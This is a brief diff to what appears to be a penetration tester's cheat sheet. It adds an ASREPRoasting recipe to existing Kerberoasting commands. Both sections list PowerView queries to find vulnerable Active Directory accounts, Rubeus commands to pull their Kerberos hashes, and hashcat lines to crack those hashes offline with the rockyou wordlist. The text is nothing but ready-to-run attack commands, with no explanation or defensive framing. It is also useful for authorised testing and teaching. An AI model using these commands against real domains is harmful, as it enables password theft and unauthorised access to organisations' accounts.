@@ -5,3 +5,7 @@ PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
 Rubeus kerberoast 
 hashcat -a 0 -m 13100 kerberoast-hashes /usr/share/wordlists/rockyou.txt 
 
+#ASREPRoasting
+PowerShell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
+Rubeus asreproast
+hashcat -a 0 -m 18200 kerberoast-hashes /usr/share/wordlists/rockyou.txt
